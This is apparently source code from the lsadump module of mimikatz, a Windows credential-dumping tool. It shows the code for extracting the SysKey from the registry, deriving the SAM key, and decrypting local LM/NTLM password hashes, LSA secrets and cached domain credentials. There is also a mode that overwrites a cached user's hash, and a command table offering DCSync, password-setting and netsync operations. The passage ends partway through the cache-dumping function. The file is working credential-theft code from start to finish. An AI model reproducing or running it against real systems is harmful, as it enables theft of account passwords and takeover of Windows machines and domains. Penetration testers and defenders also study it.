/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_lsadump.h"

const KUHL_M_C kuhl_m_c_lsadump[] = {
	{kuhl_m_lsadump_sam,		L"sam",			L"Get the SysKey to decrypt SAM entries (from registry or hives)"},
	{kuhl_m_lsadump_secrets,	L"secrets",		L"Get the SysKey to decrypt SECRETS entries (from registry or hives)"},
	{kuhl_m_lsadump_cache,		L"cache",		L"Get the SysKey to decrypt NL$KM then MSCache(v2) (from registry or hives)"},
	{kuhl_m_lsadump_lsa,		L"lsa",			L"Ask LSA Server to retrieve SAM/AD entries (normal, patch on the fly or inject)"},
	{kuhl_m_lsadump_trust,		L"trust",		L"Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly)"},
	{kuhl_m_lsadump_bkey,		L"backupkeys",	NULL},
	{kuhl_m_lsadump_rpdata,		L"rpdata",		NULL},
	{kuhl_m_lsadump_dcsync,		L"dcsync",		L"Ask a DC to synchronize an object"},
	{kuhl_m_lsadump_setntlm,	L"setntlm",		L"Ask a server to set a new password/ntlm for one user"},
	{kuhl_m_lsadump_changentlm,	L"changentlm",	L"Ask a server to set a new password/ntlm for one user"},
	{kuhl_m_lsadump_netsync,	L"netsync",		L"Ask a DC to send current and previous NTLM hash of DC/SRV/WKS"},
};

const KUHL_M kuhl_m_lsadump = {
	L"lsadump", L"LsaDump module", NULL,
	ARRAYSIZE(kuhl_m_c_lsadump), kuhl_m_c_lsadump, NULL, NULL
};

NTSTATUS kuhl_m_lsadump_sam(int argc, wchar_t * argv[])
{
	HANDLE hDataSystem, hDataSam;
	PKULL_M_REGISTRY_HANDLE hRegistry, hRegistry2;
	HKEY hBase;
	BYTE sysKey[SYSKEY_LENGTH];
	LPCWSTR szSystem = NULL, szSam = NULL;

	if(kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL))
	{
		hDataSystem = CreateFile(szSystem, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if(hDataSystem != INVALID_HANDLE_VALUE)
		{
			if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSystem, FALSE, &hRegistry))
			{
				if(kuhl_m_lsadump_getComputerAndSyskey(hRegistry, NULL, sysKey))
				{
					if(kull_m_string_args_byName(argc, argv, L"sam", &szSam, NULL))
					{
						hDataSam = CreateFile(szSam, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
						if(hDataSam != INVALID_HANDLE_VALUE)
						{
							if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSam, FALSE, &hRegistry2))
							{
								kuhl_m_lsadump_getUsersAndSamKey(hRegistry2, NULL, sysKey);
								kull_m_registry_close(hRegistry2);
							}
							CloseHandle(hDataSam);
						}
						else PRINT_ERROR_AUTO(L"CreateFile (SAM hive)");
					}
				}
				kull_m_registry_close(hRegistry);
			}
			CloseHandle(hDataSystem);
		}
		else PRINT_ERROR_AUTO(L"CreateFile (SYSTEM hive)");
	}
	else
	{
		if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, NULL, FALSE, &hRegistry))
		{
			if(kull_m_registry_RegOpenKeyEx(hRegistry, HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &hBase))
			{
				if(kuhl_m_lsadump_getComputerAndSyskey(hRegistry, hBase, sysKey))
				{
					if(kull_m_registry_RegOpenKeyEx(hRegistry, HKEY_LOCAL_MACHINE, L"SAM", 0, KEY_READ, &hBase))
					{
						kuhl_m_lsadump_getUsersAndSamKey(hRegistry, hBase, sysKey);
						kull_m_registry_RegCloseKey(hRegistry, hBase);
					}
					else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx (SAM)");
				}
				kull_m_registry_RegCloseKey(hRegistry, hBase);
			}
			kull_m_registry_close(hRegistry);
		}
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_lsadump_secrets(int argc, wchar_t * argv[])
{
	return kuhl_m_lsadump_secretsOrCache(argc, argv, TRUE);
}

NTSTATUS kuhl_m_lsadump_cache(int argc, wchar_t * argv[])
{
	return kuhl_m_lsadump_secretsOrCache(argc, argv, FALSE);
}

NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsOrCache)
{
	HANDLE hDataSystem, hDataSecurity;
	PKULL_M_REGISTRY_HANDLE hSystem, hSecurity;
	HKEY hSystemBase, hSecurityBase;
	BYTE sysKey[SYSKEY_LENGTH];
	BOOL hashStatus = FALSE;
	LPCWSTR szSystem = NULL, szSecurity = NULL, szHash, szPassword;
	UNICODE_STRING uPassword;
	KUHL_LSADUMP_DCC_CACHE_DATA cacheData = {0};

	if(!secretsOrCache)
	{
		if(kull_m_string_args_byName(argc, argv, L"user", &cacheData.username, NULL))
		{
			kprintf(L"> User cache replace mode !\n");
			kprintf(L"  * user     : %s\n", cacheData.username);
			if(kull_m_string_args_byName(argc, argv, L"ntlm", &szHash, NULL))
			{
				hashStatus = kull_m_string_stringToHex(szHash, cacheData.ntlm, LM_NTLM_HASH_LENGTH);
				if(!hashStatus)
					PRINT_ERROR(L"ntlm hash length must be 32 (16 bytes) - will use default password...\n");
			}
			if(!hashStatus)
			{
				kull_m_string_args_byName(argc, argv, L"password", &szPassword, MIMIKATZ);
				kprintf(L"  * password : %s\n", szPassword);
				RtlInitUnicodeString(&uPassword, szPassword);
				hashStatus = NT_SUCCESS(RtlDigestNTLM(&uPassword, cacheData.ntlm));
			}
			if(hashStatus)
			{
				kprintf(L"  * ntlm     : ");
				kull_m_string_wprintf_hex(cacheData.ntlm, LM_NTLM_HASH_LENGTH, 0);
				kprintf(L"\n");
			}
			else cacheData.username = NULL;
			kprintf(L"\n");
		}
	}
	
	if(kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL))
	{
		hDataSystem = CreateFile(szSystem, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if(hDataSystem != INVALID_HANDLE_VALUE)
		{
			if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSystem, FALSE, &hSystem))
			{
				if(kuhl_m_lsadump_getComputerAndSyskey(hSystem, NULL, sysKey))
				{
					if(kull_m_string_args_byName(argc, argv, L"security", &szSecurity, NULL))
					{
						hDataSecurity = CreateFile(szSecurity, GENERIC_READ | (cacheData.username ? GENERIC_WRITE : 0), 0, NULL, OPEN_EXISTING, 0, NULL);
						if(hDataSecurity != INVALID_HANDLE_VALUE)
						{
							if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSecurity, cacheData.username ? TRUE : FALSE, &hSecurity))
							{
								kuhl_m_lsadump_getLsaKeyAndSecrets(hSecurity, NULL, hSystem, NULL, sysKey, secretsOrCache, &cacheData);
								kull_m_registry_close(hSecurity);
							}
							CloseHandle(hDataSecurity);
						} else PRINT_ERROR_AUTO(L"CreateFile (SECURITY hive)");
					}
				}
				kull_m_registry_close(hSystem);
			}
			CloseHandle(hDataSystem);
		} else PRINT_ERROR_AUTO(L"CreateFile (SYSTEM hive)");
	}
	else
	{
		if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, NULL, FALSE, &hSystem))
		{
			if(kull_m_registry_RegOpenKeyEx(hSystem, HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &hSystemBase))
			{
				if(kuhl_m_lsadump_getComputerAndSyskey(hSystem, hSystemBase, sysKey))
				{
					if(kull_m_registry_RegOpenKeyEx(hSystem, HKEY_LOCAL_MACHINE, L"SECURITY", 0, KEY_READ, &hSecurityBase))
					{
						kuhl_m_lsadump_getLsaKeyAndSecrets(hSystem, hSecurityBase, hSystem, hSystemBase, sysKey, secretsOrCache, &cacheData);
						kull_m_registry_RegCloseKey(hSystem, hSecurityBase);
					}
					else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx (SECURITY)");
				}
				kull_m_registry_RegCloseKey(hSystem, hSystemBase);
			}
			kull_m_registry_close(hSystem);
		}
	}
	return STATUS_SUCCESS;
}

const wchar_t * kuhl_m_lsadump_CONTROLSET_SOURCES[] = {L"Current", L"Default"};
BOOL kuhl_m_lsadump_getCurrentControlSet(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hSystemBase, PHKEY phCurrentControlSet)
{
	BOOL status = FALSE;
	HKEY hSelect;
	DWORD i, szNeeded, controlSet;

	wchar_t currentControlSet[] = L"ControlSet000";

	if(kull_m_registry_RegOpenKeyEx(hRegistry, hSystemBase, L"Select", 0, KEY_READ, &hSelect))
	{
		for(i = 0; !status && (i < ARRAYSIZE(kuhl_m_lsadump_CONTROLSET_SOURCES)); i++)
		{
			szNeeded = sizeof(DWORD); 
			status = kull_m_registry_RegQueryValueEx(hRegistry, hSelect, kuhl_m_lsadump_CONTROLSET_SOURCES[i], NULL, NULL, (LPBYTE) &controlSet, &szNeeded);
		}

		if(status)
		{
			status = FALSE;
			if(swprintf_s(currentControlSet + 10, 4, L"%03u", controlSet) != -1)
				status = kull_m_registry_RegOpenKeyEx(hRegistry, hSystemBase, currentControlSet, 0, KEY_READ, phCurrentControlSet);
		}
		kull_m_registry_RegCloseKey(hRegistry, hSelect);
	}
	return status;
}

const wchar_t * kuhl_m_lsadump_SYSKEY_NAMES[] = {L"JD", L"Skew1", L"GBG", L"Data"};
const BYTE kuhl_m_lsadump_SYSKEY_PERMUT[] = {11, 6, 7, 1, 8, 10, 14, 0, 3, 5, 2, 15, 13, 9, 12, 4};
BOOL kuhl_m_lsadump_getSyskey(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hLSA, LPBYTE sysKey)
{
	BOOL status = TRUE;
	DWORD i;
	HKEY hKey;
	wchar_t buffer[8 + 1];
	DWORD szBuffer;
	BYTE buffKey[SYSKEY_LENGTH];

	for(i = 0 ; (i < ARRAYSIZE(kuhl_m_lsadump_SYSKEY_NAMES)) && status; i++)
	{
		status = FALSE;
		if(kull_m_registry_RegOpenKeyEx(hRegistry, hLSA, kuhl_m_lsadump_SYSKEY_NAMES[i], 0, KEY_READ, &hKey))
		{
			szBuffer = 8 + 1;
			if(kull_m_registry_RegQueryInfoKey(hRegistry, hKey, buffer, &szBuffer, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL))
				status = swscanf_s(buffer, L"%x", (DWORD *) &buffKey[i*sizeof(DWORD)]) != -1;
			kull_m_registry_RegCloseKey(hRegistry, hKey);
		}
		else PRINT_ERROR(L"LSA Key Class read error\n");
	}
	for(i = 0; i < SYSKEY_LENGTH; i++)
		sysKey[i] = buffKey[kuhl_m_lsadump_SYSKEY_PERMUT[i]];	

	return status;
}

BOOL kuhl_m_lsadump_getComputerAndSyskey(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hSystemBase, OUT LPBYTE sysKey)
{
	BOOL status = FALSE;
	PVOID computerName;
	HKEY hCurrentControlSet, hComputerNameOrLSA;

	if(kuhl_m_lsadump_getCurrentControlSet(hRegistry, hSystemBase, &hCurrentControlSet))
	{
		kprintf(L"Domain : ");
		if(kull_m_registry_OpenAndQueryWithAlloc(hRegistry, hCurrentControlSet, L"Control\\ComputerName\\ComputerName", L"ComputerName", NULL, &computerName, NULL))
		{
			kprintf(L"%s\n", computerName);
			LocalFree(computerName);
		}

		kprintf(L"SysKey : ");
		if(kull_m_registry_RegOpenKeyEx(hRegistry, hCurrentControlSet, L"Control\\LSA", 0, KEY_READ, &hComputerNameOrLSA))
		{
			if(status = kuhl_m_lsadump_getSyskey(hRegistry, hComputerNameOrLSA, sysKey))
			{
				kull_m_string_wprintf_hex(sysKey, SYSKEY_LENGTH, 0);
				kprintf(L"\n");
			}
			else PRINT_ERROR(L"kuhl_m_lsadump_getSyskey KO\n");
			kull_m_registry_RegCloseKey(hRegistry, hComputerNameOrLSA);
		}
		else PRINT_ERROR(L"kull_m_registry_RegOpenKeyEx LSA KO\n");

		kull_m_registry_RegCloseKey(hRegistry, hCurrentControlSet);
	}
	return status;
}

BOOL kuhl_m_lsadump_getUsersAndSamKey(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hSAMBase, IN LPBYTE sysKey)
{
	BOOL status = FALSE;
	BYTE samKey[SAM_KEY_DATA_KEY_LENGTH];
	wchar_t * user;
	HKEY hAccount, hUsers;
	DWORD i, nbSubKeys, szMaxSubKeyLen, szUser, rid;
	PUSER_ACCOUNT_V pUAv;
	LPVOID data;

	if(kull_m_registry_OpenAndQueryWithAlloc(hRegistry, hSAMBase, L"SAM\\Domains\\Account", L"V", NULL, &data, &szUser))
	{
		kprintf(L"Local SID : ");
		kull_m_string_displaySID((PBYTE) data + szUser - (sizeof(SID) + sizeof(DWORD) * 3));
		kprintf(L"\n");
		LocalFree(data);
	}

	if(kull_m_registry_RegOpenKeyEx(hRegistry, hSAMBase, L"SAM\\Domains\\Account", 0, KEY_READ, &hAccount))
	{
		if(kuhl_m_lsadump_getSamKey(hRegistry, hAccount, sysKey, samKey))
		{
			if(kull_m_registry_RegOpenKeyEx(hRegistry, hAccount, L"Users", 0, KEY_READ, &hUsers))
			{
				if(status = kull_m_registry_RegQueryInfoKey(hRegistry, hUsers, NULL, NULL, NULL, &nbSubKeys, &szMaxSubKeyLen, NULL, NULL, NULL, NULL, NULL, NULL))
				{
					szMaxSubKeyLen++;
					if(user = (wchar_t *) LocalAlloc(LPTR, (szMaxSubKeyLen + 1) * sizeof(wchar_t)))
					{
						for(i = 0; i < nbSubKeys; i++)
						{
							szUser = szMaxSubKeyLen;
							if(kull_m_registry_RegEnumKeyEx(hRegistry, hUsers, i, user, &szUser, NULL, NULL, NULL, NULL))
							{
								if(_wcsicmp(user, L"Names"))
								{
									if(swscanf_s(user, L"%x", &rid) != -1)
									{
										kprintf(L"\nRID  : %08x (%u)\n", rid, rid);
										if(status &= kull_m_registry_OpenAndQueryWithAlloc(hRegistry, hUsers, user, L"V", NULL, (LPVOID *) &pUAv, NULL))
										{
											kprintf(L"User : %.*s\n", pUAv->Username.lenght / sizeof(wchar_t), (wchar_t *) (pUAv->datas + pUAv->Username.offset));
											kuhl_m_lsadump_getHash(&pUAv->LMHash, pUAv->datas, samKey, rid, FALSE);
											kuhl_m_lsadump_getHash(&pUAv->NTLMHash, pUAv->datas, samKey, rid, TRUE);
											LocalFree(pUAv);
										}
									}
								}
							}
						}
						LocalFree(user);
					}
				}
				kull_m_registry_RegCloseKey(hRegistry, hUsers);
			}
		}
		else PRINT_ERROR(L"kuhl_m_lsadump_getSamKey KO\n");
		kull_m_registry_RegCloseKey(hRegistry, hAccount);
	}
	else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx SAM Accounts");

	return status;
}

const BYTE kuhl_m_lsadump_NTPASSWORD[] = "NTPASSWORD";
const BYTE kuhl_m_lsadump_LMPASSWORD[] = "LMPASSWORD";
BOOL kuhl_m_lsadump_getHash(PSAM_SENTRY pSamHash, LPCBYTE pStartOfData, LPCBYTE samKey, DWORD rid, BOOL isNtlm)
{
	BOOL status = FALSE;
	MD5_CTX md5ctx;
	PSAM_HASH pHash = (PSAM_HASH) (pStartOfData + pSamHash->offset);
	PSAM_HASH_AES pHashAes;
	BYTE cypheredHash[LM_NTLM_HASH_LENGTH], clearHash[LM_NTLM_HASH_LENGTH];
	CRYPTO_BUFFER cypheredHashBuffer = {LM_NTLM_HASH_LENGTH, LM_NTLM_HASH_LENGTH, cypheredHash}, keyBuffer = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
	PVOID out;
	DWORD len;

	kprintf(L"%s : ", isNtlm ? L"NTLM" : L"LM  ");
	if(pSamHash->offset)
	{
		switch(pHash->Revision)
		{
		case 1:
			if(pSamHash->lenght == sizeof(SAM_HASH))
			{
				MD5Init(&md5ctx);
				MD5Update(&md5ctx, samKey, SAM_KEY_DATA_KEY_LENGTH);
				MD5Update(&md5ctx, &rid, sizeof(DWORD));
				MD5Update(&md5ctx, isNtlm ? kuhl_m_lsadump_NTPASSWORD : kuhl_m_lsadump_LMPASSWORD, isNtlm ? sizeof(kuhl_m_lsadump_NTPASSWORD) : sizeof(kuhl_m_lsadump_LMPASSWORD));
				MD5Final(&md5ctx);
				RtlCopyMemory(cypheredHash, pHash->hash, LM_NTLM_HASH_LENGTH);
				if(!(status = NT_SUCCESS(RtlEncryptDecryptRC4(&cypheredHashBuffer, &keyBuffer))))
					PRINT_ERROR(L"RtlEncryptDecryptRC4");
			}
			break;
		case 2:
			pHashAes = (PSAM_HASH_AES) pHash;
			if(pHashAes->dataOffset >= SAM_KEY_DATA_SALT_LENGTH)
			{

				if(kull_m_crypto_genericAES128Decrypt(samKey, pHashAes->Salt, pHashAes->data, pSamHash->lenght - FIELD_OFFSET(SAM_HASH_AES, data), &out, &len))
				{
					if(status = (len == LM_NTLM_HASH_LENGTH))
						RtlCopyMemory(cypheredHash, out, LM_NTLM_HASH_LENGTH);
					else PRINT_ERROR(L"Hash size %u != %u", len, LM_NTLM_HASH_LENGTH);
					LocalFree(out);
				}
			}
			break;
		default :
			PRINT_ERROR(L"Unknow SAM_HASH revision (%hu)", pHash->Revision);
		}

		if(status)
		{
			if(status = NT_SUCCESS(RtlDecryptDES2blocks1DWORD(cypheredHash, &rid, clearHash)))
				kull_m_string_wprintf_hex(clearHash, LM_NTLM_HASH_LENGTH, 0);
			else PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
		}
	}
	kprintf(L"\n");
	return status;
}

const BYTE kuhl_m_lsadump_qwertyuiopazxc[] = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%";
const BYTE kuhl_m_lsadump_01234567890123[] = "0123456789012345678901234567890123456789";
BOOL kuhl_m_lsadump_getSamKey(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hAccount, LPCBYTE sysKey, LPBYTE samKey)
{
	BOOL status = FALSE;
	PDOMAIN_ACCOUNT_F pDomAccF;
	MD5_CTX md5ctx;
	CRYPTO_BUFFER data = {SAM_KEY_DATA_KEY_LENGTH, SAM_KEY_DATA_KEY_LENGTH, samKey}, key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
	PSAM_KEY_DATA_AES pAesKey;
	PVOID out;
	DWORD len;

	kprintf(L"\nSAMKey : ");
	if(kull_m_registry_OpenAndQueryWithAlloc(hRegistry, hAccount, NULL, L"F", NULL, (LPVOID *) &pDomAccF, NULL))
	{
		switch(pDomAccF->Revision)
		{
		case 2:
			if(pDomAccF->keys1.Revision == 1)
			{
				MD5Init(&md5ctx);
				MD5Update(&md5ctx, pDomAccF->keys1.Salt, SAM_KEY_DATA_SALT_LENGTH);
				MD5Update(&md5ctx, kuhl_m_lsadump_qwertyuiopazxc, sizeof(kuhl_m_lsadump_qwertyuiopazxc));
				MD5Update(&md5ctx, sysKey, SYSKEY_LENGTH);
				MD5Update(&md5ctx, kuhl_m_lsadump_01234567890123, sizeof(kuhl_m_lsadump_01234567890123));
				MD5Final(&md5ctx);
				RtlCopyMemory(samKey, pDomAccF->keys1.Key, SAM_KEY_DATA_KEY_LENGTH);
				if(!(status = NT_SUCCESS(RtlEncryptDecryptRC4(&data, &key))))
					PRINT_ERROR(L"RtlEncryptDecryptRC4 KO");
			}
			else PRINT_ERROR(L"Unknow Classic Struct Key revision (%u)", pDomAccF->keys1.Revision);
			break;
		case 3:
			pAesKey = (PSAM_KEY_DATA_AES) &pDomAccF->keys1;
			if(pAesKey->Revision == 2)
			{
				pAesKey = (PSAM_KEY_DATA_AES) &pDomAccF->keys1;
				if(kull_m_crypto_genericAES128Decrypt(sysKey, pAesKey->Salt, pAesKey->data, pAesKey->DataLen, &out, &len))
				{
					if(status = (len == SAM_KEY_DATA_KEY_LENGTH))
						RtlCopyMemory(samKey, out, SAM_KEY_DATA_KEY_LENGTH);
					LocalFree(out);
				}
			}
			else PRINT_ERROR(L"Unknow Struct Key revision (%u)", pDomAccF->keys1.Revision);
			break;
		default:
			PRINT_ERROR(L"Unknow F revision (%hu)", pDomAccF->Revision);
		}
		LocalFree(pDomAccF);
	}
	else PRINT_ERROR(L"kull_m_registry_OpenAndQueryWithAlloc KO");

	if(status)
		kull_m_string_wprintf_hex(samKey, LM_NTLM_HASH_LENGTH, 0);

	kprintf(L"\n");
	return status;
}

BOOL kuhl_m_lsadump_getSids(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN LPCWSTR littleKey, IN LPCWSTR prefix)
{
	BOOL status = FALSE;
	wchar_t name[] = L"Pol__DmN", sid[] = L"Pol__DmS";
	PVOID buffer;
	LSA_UNICODE_STRING uString = {0, 0, NULL};

	RtlCopyMemory(&name[3], littleKey, 2*sizeof(wchar_t));
	RtlCopyMemory(&sid[3], littleKey, 2*sizeof(wchar_t));
	kprintf(L"%s name : ", prefix);
	if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hPolicyBase, name, NULL, NULL, &buffer, NULL))
	{
		uString.Length = ((PUSHORT) buffer)[0];
		uString.MaximumLength = ((PUSHORT) buffer)[1];
		uString.Buffer = (PWSTR) ((PBYTE) buffer + *(PDWORD) ((PBYTE) buffer + 2*sizeof(USHORT)));
		kprintf(L"%wZ", &uString);
		LocalFree(buffer);
	}
	if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hPolicyBase, sid, NULL, NULL, &buffer, NULL))
	{
		kprintf(L" ( ");
		kull_m_string_displaySID((PSID) buffer);
		kprintf(L" )");
		LocalFree(buffer);
	}
	kprintf(L"\n");
	return status;
}

BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hSecurityBase, IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, IN LPBYTE sysKey, IN BOOL secretsOrCache, IN PKUHL_LSADUMP_DCC_CACHE_DATA pCacheData)
{
	BOOL status = FALSE;
	HKEY hPolicy;
	PPOL_REVISION pPolRevision;
	DWORD szNeeded, i, offset;
	LPVOID buffer;
	MD5_CTX md5ctx;
	CRYPTO_BUFFER data = {3 * sizeof(NT5_SYSTEM_KEY), 3 * sizeof(NT5_SYSTEM_KEY), NULL}, key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
	PNT6_SYSTEM_KEYS nt6keysStream = NULL;
	PNT6_SYSTEM_KEY nt6key;
	PNT5_SYSTEM_KEY nt5key = NULL;
	LSA_UNICODE_STRING uString = {0, 0, NULL};

	if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecurityBase, L"Policy", 0, KEY_READ, &hPolicy))
	{
		kprintf(L"\n");
		kuhl_m_lsadump_getSids(hSecurity, hPolicy, L"Ac", L"Local");
		kuhl_m_lsadump_getSids(hSecurity, hPolicy, L"Pr", L"Domain");

		if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hPolicy, L"PolDnDDN", NULL, NULL, &buffer, NULL))
		{
			uString.Length = ((PUSHORT) buffer)[0];
			uString.MaximumLength = ((PUSHORT) buffer)[1];
			uString.Buffer = (PWSTR) ((PBYTE) buffer + *(PDWORD) ((PBYTE) buffer + 2*sizeof(USHORT)));
			kprintf(L"Domain FQDN : %wZ\n", &uString);
			LocalFree(buffer);
		}

		if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hPolicy, L"PolRevision", NULL, NULL, (LPVOID *) &pPolRevision, NULL))
		{
			kprintf(L"\nPolicy subsystem is : %hu.%hu\n", pPolRevision->Major, pPolRevision->Minor);
			if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hPolicy, (pPolRevision->Minor > 9) ? L"PolEKList" : L"PolSecretEncryptionKey", NULL, NULL, &buffer, &szNeeded))
			{
				if(pPolRevision->Minor > 9) // NT 6
				{
					if(kuhl_m_lsadump_sec_aes256((PNT6_HARD_SECRET) buffer, szNeeded, NULL, sysKey))
					{
						if(nt6keysStream = (PNT6_SYSTEM_KEYS) LocalAlloc(LPTR, ((PNT6_HARD_SECRET) buffer)->clearSecret.SecretSize))
						{
							RtlCopyMemory(nt6keysStream, ((PNT6_HARD_SECRET) buffer)->clearSecret.Secret, ((PNT6_HARD_SECRET) buffer)->clearSecret.SecretSize);
							kprintf(L"LSA Key(s) : %u, default ", nt6keysStream->nbKeys); kull_m_string_displayGUID(&nt6keysStream->CurrentKeyID); kprintf(L"\n");
							for(i = 0, offset = 0; i < nt6keysStream->nbKeys; i++, offset += FIELD_OFFSET(NT6_SYSTEM_KEY, Key) + nt6key->KeySize)
							{
								nt6key = (PNT6_SYSTEM_KEY) ((PBYTE) nt6keysStream->Keys + offset);
								kprintf(L"  [%02u] ", i); kull_m_string_displayGUID(&nt6key->KeyId); kprintf(L" "); kull_m_string_wprintf_hex(nt6key->Key, nt6key->KeySize, 0); kprintf(L"\n");
							}
						}
					}
				}
				else // NT 5
				{
					MD5Init(&md5ctx);
					MD5Update(&md5ctx, sysKey, SYSKEY_LENGTH);
					for(i = 0; i < 1000; i++)
						MD5Update(&md5ctx, ((PNT5_SYSTEM_KEYS) buffer)->lazyiv, LAZY_IV_SIZE);
					MD5Final(&md5ctx);
					data.Buffer = (PBYTE) ((PNT5_SYSTEM_KEYS) buffer)->keys;
					if(NT_SUCCESS(RtlEncryptDecryptRC4(&data, &key)))
					{
						if(nt5key = (PNT5_SYSTEM_KEY) LocalAlloc(LPTR, sizeof(NT5_SYSTEM_KEY)))
						{
							RtlCopyMemory(nt5key->key, ((PNT5_SYSTEM_KEYS) buffer)->keys[1].key, sizeof(NT5_SYSTEM_KEY));
							kprintf(L"LSA Key : "); 
							kull_m_string_wprintf_hex(nt5key->key, sizeof(NT5_SYSTEM_KEY), 0);
							kprintf(L"\n");
						}
					}
				}
				LocalFree(buffer);
			}
			LocalFree(pPolRevision);
		}

		if(nt6keysStream || nt5key)
		{
			if(secretsOrCache)
				kuhl_m_lsadump_getSecrets(hSecurity, hPolicy, hSystem, hSystemBase, nt6keysStream, nt5key);
			else
				kuhl_m_lsadump_getNLKMSecretAndCache(hSecurity, hPolicy, hSecurityBase, nt6keysStream, nt5key, pCacheData);
		}
		kull_m_registry_RegCloseKey(hSecurity, hPolicy);
	}

	if(nt6keysStream)
		LocalFree(nt6keysStream);
	if(nt5key)
		LocalFree(nt5key);

	return status;
}

BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, PNT6_SYSTEM_KEYS lsaKeysStream, PNT5_SYSTEM_KEY lsaKeyUnique)
{
	BOOL status = FALSE;
	HKEY hSecrets, hSecret, hCurrentControlSet, hServiceBase;
	DWORD i, nbSubKeys, szMaxSubKeyLen, szSecretName, szSecret;
	PVOID pSecret;
	wchar_t * secretName;

	if(kull_m_registry_RegOpenKeyEx(hSecurity, hPolicyBase, L"Secrets", 0, KEY_READ, &hSecrets))
	{
		if(kuhl_m_lsadump_getCurrentControlSet(hSystem, hSystemBase, &hCurrentControlSet))
		{
			if(kull_m_registry_RegOpenKeyEx(hSystem, hCurrentControlSet, L"services", 0, KEY_READ, &hServiceBase))
			{
				if(kull_m_registry_RegQueryInfoKey(hSecurity, hSecrets, NULL, NULL, NULL, &nbSubKeys, &szMaxSubKeyLen, NULL, NULL, NULL, NULL, NULL, NULL))
				{
					szMaxSubKeyLen++;
					if(secretName = (wchar_t *) LocalAlloc(LPTR, (szMaxSubKeyLen + 1) * sizeof(wchar_t)))
					{
						for(i = 0; i < nbSubKeys; i++)
						{
							szSecretName = szMaxSubKeyLen;
							if(kull_m_registry_RegEnumKeyEx(hSecurity, hSecrets, i, secretName, &szSecretName, NULL, NULL, NULL, NULL))
							{
								kprintf(L"\nSecret  : %s", secretName);

								if(_wcsnicmp(secretName, L"_SC_", 4) == 0)
									kuhl_m_lsadump_getInfosFromServiceName(hSystem, hServiceBase, secretName + 4);

								if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecrets, secretName, 0, KEY_READ, &hSecret))
								{
									if(kuhl_m_lsadump_decryptSecret(hSecurity, hSecret, L"CurrVal", lsaKeysStream, lsaKeyUnique, &pSecret, &szSecret))
									{
										kuhl_m_lsadump_candidateSecret(szSecret, pSecret, L"\ncur/", secretName);
										LocalFree(pSecret);
									}
									if(kuhl_m_lsadump_decryptSecret(hSecurity, hSecret, L"OldVal", lsaKeysStream, lsaKeyUnique, &pSecret, &szSecret))
									{
										kuhl_m_lsadump_candidateSecret(szSecret, pSecret, L"\nold/", secretName);
										LocalFree(pSecret);
									}
									kull_m_registry_RegCloseKey(hSecurity, hSecret);
								}
								kprintf(L"\n");
							}
						}
						LocalFree(secretName);
					}
				}
				kull_m_registry_RegCloseKey(hSystem, hServiceBase);
			}
			kull_m_registry_RegCloseKey(hSystem, hCurrentControlSet);
		}
		kull_m_registry_RegCloseKey(hSecurity, hSecrets);
	}
	return status;
}

BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN HKEY hSecurityBase, PNT6_SYSTEM_KEYS lsaKeysStream, PNT5_SYSTEM_KEY lsaKeyUnique, IN PKUHL_LSADUMP_DCC_CACHE_DATA pCacheData)
{
	BOOL status = FALSE;
	HKEY hCache;
	DWORD i, iter = 10240, szNLKM, type, nbValues, szMaxValueNameLen, szMaxValueLen, szSecretName, szSecret, szNeeded, s1;
	PVOID pNLKM;
	wchar_t * secretName;
	PMSCACHE_ENTRY pMsCacheEntry;
	NTSTATUS nStatus;
